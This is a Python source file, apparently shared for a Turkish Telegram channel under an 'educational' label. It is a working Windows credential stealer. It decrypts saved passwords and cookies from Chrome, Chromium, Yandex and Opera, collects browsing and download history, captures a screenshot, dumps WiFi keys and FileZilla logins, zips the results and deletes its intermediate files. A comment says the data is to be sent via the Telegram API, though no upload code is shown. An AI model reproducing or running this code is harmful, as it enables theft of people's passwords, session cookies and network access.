#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

import os                   # Dizinler ve dosyalarla çalışmak için
import shutil               # Tarayıcı verilerini kopyalamak için
import sqlite3              # Tarayıcıdan çekilen veritabanlarıyla çalışmak için
import win32crypt           # Tarayıcıdan çekilen şifrelenmiş verileri çözmek için
from PIL import ImageGrab   # Ekran görüntüsü almak için
import subprocess           # WiFi işlemini Yakalamak için
from lxml import etree      # FileZilla Dosyasını Okumak için
import base64               # FileZilla'nın Şifrelenmiş verisini çözmek için.
import re                   # Spesifik dosya seçebilmek için
import zipfile              # Topladığımız verileri Zip'lemek için
import requests             # Verileri Telegram apisi ile almak için

kullanici_adi = os.getlogin()
chrome_yolu = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\'
chromium_yolu = os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\'
yandex_yolu = os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\'
opera_yolu = os.getenv("LOCALAPPDATA") + '\\Opera Software\\Opera Stable\\'
app_data = os.getenv("APPDATA") + '\\'
filezilla_yolu = app_data + '\\FileZilla\\'
txt_baslik = f"""@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!

{kullanici_adi} İsimli Bilgisayarın"""


def ChromePass():
    if os.path.exists(chrome_yolu + 'Login Data'):

        # DB'yi Kopyala
        shutil.copy2(chrome_yolu + 'Login Data', app_data + f'{kullanici_adi}_ChromeLoginData.sql')

        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(app_data + f'{kullanici_adi}_ChromeLoginData.sql')
        cursor = conn.cursor()

        # Dosya Oluştur Başlık Gir
        ust_bilgi = txt_baslik + '\n\n\t\t\tChrome Tarayıcı Şifreleri\n\n'
        file = open(app_data + f'{kullanici_adi}_ChromePass.txt', "w+")  #
        file.write(ust_bilgi)
        file.close()

        # Sonuçları getir
        gelen_veri = []
        cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            # Login ve url Kolonları
            login = result[1]
            url = result[0]

            try:
                password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                if login and url and password:
                    data = '=' * 100 + '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n' + '=' * 100
                    gelen_veri.append(data)
            except:
                pass

        for sonuc in gelen_veri:
            file = open(app_data + f'{kullanici_adi}_ChromePass.txt', "a+")  #
            file.write(sonuc + '\n')
            file.close()

def ChromeCookies():
    if os.path.exists(chrome_yolu + 'Cookies'):

        # DB'yi Kopyala
        shutil.copy2(chrome_yolu + 'Cookies', app_data + f'{kullanici_adi}_ChromeCookies.sql')

        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(app_data + f'{kullanici_adi}_ChromeCookies.sql')
        cursor = conn.cursor()

        # Dosya Oluştur Başlık Gir
        ust_bilgi = txt_baslik + '\n\n\t\t\tChrome Tarayıcı Çerezleri\n\n'
        file = open(app_data + f'{kullanici_adi}_ChromeCookies.txt', "w+")  #
        file.write(ust_bilgi)
        file.close()

        # Sonuçları getir
        gelen_veri = []
        cursor.execute('SELECT * from cookies')
        for result in cursor.fetchall():
            # url ve name Kolonları
            url = result[1]
            name = result[2]

            try:
                cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
                if url and name and cookie:
                    data = '=' * 100 + '\nURL: ' + url + '\nCOOKIE: ' + cookie + '\nCOOKIE NAME: ' + name + '\n' + '=' * 100
                    gelen_veri.append(data)
            except:
                pass

        for sonuc in gelen_veri:
            file = open(app_data + f'{kullanici_adi}_ChromeCookies.txt', "a+")  #
            file.write(sonuc + '\n')
            file.close()

def ChromeDownloadHistory():
    if os.path.exists(chrome_yolu + 'History'):

        # DB'yi Kopyala
        shutil.copy2(chrome_yolu + 'History', app_data + f'{kullanici_adi}_ChromeHistory.sql')

        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(app_data + f'{kullanici_adi}_ChromeHistory.sql')
        cursor = conn.cursor()

        # Dosya Oluştur Başlık Gir
        ust_bilgi = txt_baslik + '\n\n\t\t\tChrome Tarayıcı İndirme Geçmişi\n\n'
        file = open(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt', "w+")  #
        file.write(ust_bilgi)
        file.close()

        # Sonuçları getir
        gelen_veri = []
        cursor.execute('SELECT current_path, tab_url from downloads')
        for result in cursor.fetchall():
            # dizin ve url Kolonları
            dizin = result[0]
            url = result[1]

            try:
                if dizin and url:
                    data = '=' * 100 + '\nDizin: ' + dizin + '\nURL: ' + url + '\n' + '=' * 100
                    gelen_veri.append(data)
            except:
                pass

        for sonuc in gelen_veri:
            file = open(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt', "a+")  #
            file.write(sonuc + '\n')
            file.close()

def ChromeURLHistory():
    if os.path.exists(chrome_yolu + 'History'):

        # DB'yi Kopyala
        shutil.copy2(chrome_yolu + 'History', app_data + f'{kullanici_adi}_ChromeHistory.sql')

        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(app_data + f'{kullanici_adi}_ChromeHistory.sql')
        cursor = conn.cursor()

        # Dosya Oluştur Başlık Gir
        ust_bilgi = txt_baslik + '\n\n\t\t\tChrome Tarayıcı url Geçmişi\n\n'
        file = open(app_data + f'{kullanici_adi}_ChromeURLHistory.txt', "w+")  #
        file.write(ust_bilgi)
        file.close()

        # Sonuçları getir
        gelen_veri = []
        cursor.execute('SELECT title, url from urls')
        for result in cursor.fetchall():
            # baslik ve url Kolonları
            baslik = result[0]
            url = result[1]

            try:
                if baslik and url:
                    data = '=' * 100 + '\nBaşlık: ' + baslik + '\nURL: ' + url + '\n' + '=' * 100
                    gelen_veri.append(data)
            except:
                pass

        for sonuc in gelen_veri:
            try:
                file = open(app_data + f'{kullanici_adi}_ChromeURLHistory.txt', "a+")  #
                file.write(sonuc + '\n')
                file.close()
            except:
                pass

def ScreenShot():
    screen = ImageGrab.grab()
    screen.save(app_data + f'{kullanici_adi}_ScreenShot.jpg')

def WiFiPass():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'
                                    ]).decode('utf-8', errors="backslashreplace").split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

    # Dosya Oluştur Başlık Gir
    ust_bilgi = txt_baslik + '\n\n\t\t\tWiFi Şifreleri\n\n'
    file = open(app_data + f'{kullanici_adi}_WifiPass.txt', "w+")  #
    file.write(ust_bilgi + '=' * 100)
    file.close()

    for i in profiles:
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'
                                               ]).decode('utf-8', errors="backslashreplace").split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                sonuc = "{:<30}|  {:<}".format(i, results[0])
                file = open(app_data + f'{kullanici_adi}_WifiPass.txt', "a+")  #
                cikti = '\n' + sonuc + '\n' + '=' * 100
                file.write(cikti)
                file.close()
            except IndexError:
                sonuc = "{:<30}|  {:<}".format(i, "")
                file = open(app_data + f'{kullanici_adi}_WifiPass.txt', "a+")  #
                cikti = '\n' + sonuc + '\n' + '=' * 100
                file.write(cikti)
                file.close()
        except subprocess.CalledProcessError:
            sonuc = "{:<30}|  {:<}".format(i, "ENCODING ERROR")
            file = open(app_data + f'{kullanici_adi}_WifiPass.txt', "a+")  #
            cikti = '\n' + sonuc + '\n' + '=' * 100
            file.write(cikti)
            file.close()

def ChromiumPass():
    if os.path.exists(chromium_yolu + 'Login Data'):

        # DB'yi Kopyala
        shutil.copy2(chromium_yolu + 'Login Data', app_data + f'{kullanici_adi}_ChromiumLoginData.sql')

        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(app_data + f'{kullanici_adi}_ChromiumLoginData.sql')
        cursor = conn.cursor()

        # Dosya Oluştur Başlık Gir
        ust_bilgi = txt_baslik + '\n\n\t\t\tChromium Tarayıcı Şifreleri\n\n'
        file = open(app_data + f'{kullanici_adi}_ChromiumPass.txt', "w+")  #
        file.write(ust_bilgi)
        file.close()

        # Sonuçları getir
        gelen_veri = []
        cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            # Login ve url Kolonları
            login = result[1]
            url = result[0]

            try:
                password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                if login and url and password:
                    data = '=' * 100 + '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n' + '=' * 100
                    gelen_veri.append(data)
            except:
                pass

        for sonuc in gelen_veri:
            file = open(app_data + f'{kullanici_adi}_ChromiumPass.txt', "a+")  #
            file.write(sonuc + '\n')
            file.close()

def YandexPass():
    if os.path.exists(yandex_yolu + 'Ya Login Data.db'):

        # DB'yi Kopyala
        shutil.copy2(yandex_yolu + 'Ya Login Data.db', app_data + f'{kullanici_adi}_YandexLoginData.db')

        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(app_data + f'{kullanici_adi}_YandexLoginData.db')
        cursor = conn.cursor()

        # Dosya Oluştur Başlık Gir
        ust_bilgi = txt_baslik + '\n\n\t\t\tYandex Tarayıcı Şifreleri\n\n'
        file = open(app_data + f'{kullanici_adi}_YandexPass.txt', "w+")  #
        file.write(ust_bilgi)
        file.close()

        # Sonuçları getir
        gelen_veri = []
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            # Login ve url Kolonları
            login = result[1]
            url = result[0]

            try:
                password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                if login and url and password:
                    data = '=' * 100 + '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n' + '=' * 100
                    gelen_veri.append(data)
            except:
                pass

        for sonuc in gelen_veri:
            file = open(app_data + f'{kullanici_adi}_YandexPass.txt', "a+")  #
            file.write(sonuc + '\n')
            file.close()

def OperaPass():
    if os.path.exists(opera_yolu + 'Login Data'):

        # DB'yi Kopyala
        shutil.copy2(opera_yolu + 'Login Data', app_data + f'{kullanici_adi}_OperaLoginData.sql')

        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(app_data + f'{kullanici_adi}_OperaLoginData.sql')
        cursor = conn.cursor()

        # Dosya Oluştur Başlık Gir
        ust_bilgi = txt_baslik + '\n\n\t\t\tOpera Tarayıcı Şifreleri\n\n'
        file = open(app_data + f'{kullanici_adi}_OperaPass.txt', "w+")  #
        file.write(ust_bilgi)
        file.close()

        # Sonuçları getir
        gelen_veri = []
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            # Login ve url Kolonları
            login = result[1]
            url = result[0]

            try:
                password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                if login and url and password:
                    data = '=' * 100 + '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n' + '=' * 100
                    gelen_veri.append(data)
            except:
                pass

        for sonuc in gelen_veri:
            file = open(app_data + f'{kullanici_adi}_OperaPass.txt', "a+")  #
            file.write(sonuc + '\n')
            file.close()

def FileZillaPass():
    if os.path.isfile(filezilla_yolu + 'recentservers.xml') is True:
        root = etree.parse(filezilla_yolu + 'recentservers.xml').getroot()

        # Dosya Oluştur Başlık Gir
        ust_bilgi = txt_baslik + '\n\n\t\t\tFileZilla Şifreleri\n\n'
        file = open(app_data + f'{kullanici_adi}_FileZillaPass.txt', "w+")  #
        file.write(ust_bilgi)
        file.close()

        # Sonuçları getir
        gelen_veri = []
        for i in range(len(root[0])):
            host = root[0][i][0].text
            port = root[0][i][1].text
            user = root[0][i][4].text
            try:
                password = base64.b64decode(root[0][i][5].text).decode('utf-8')
                if host and user and password:
                    data = '=' * 100 + '\nhost: ' + host + '\nport: ' + port + '\nuser: ' + user + '\npass: ' + password + '\n' + '=' * 100
                    gelen_veri.append(data)
            except:
                pass
        for sonuc in gelen_veri:
            file = open(app_data + f'{kullanici_adi}_FileZillaPass.txt', "a+")  #
            file.write(sonuc + '\n')
            file.close()

ChromePass()
ChromeCookies()
ChromeDownloadHistory()
ChromeURLHistory()
ScreenShot()
WiFiPass()
ChromiumPass()
YandexPass()
OperaPass()
FileZillaPass()

def ZipFile():
    zip_adi = app_data + f'{kullanici_adi}_LOG.zip'
    yeni_zip = zipfile.ZipFile(zip_adi, 'w')

    dosyalar = os.listdir(app_data)
    for i in dosyalar:
        if re.match(f"{kullanici_adi}*.*txt",i) or \
                re.match(f"{kullanici_adi}*.*jpg",i):
            yeni_zip.write(app_data + i)

    yeni_zip.close()
ZipFile()

def DosyaYokEt():
    dosyalar = os.listdir(app_data)
    for i in dosyalar:
        if re.match(f"{kullanici_adi}*.*txt",i) or \
                re.match(f"{kullanici_adi}*.*jpg",i) or \
                re.match(f"{kullanici_adi}*.*sql",i) or \
                re.match(f"{kullanici_adi}*.*db",i):
            os.remove(app_data + i)
DosyaYokEt()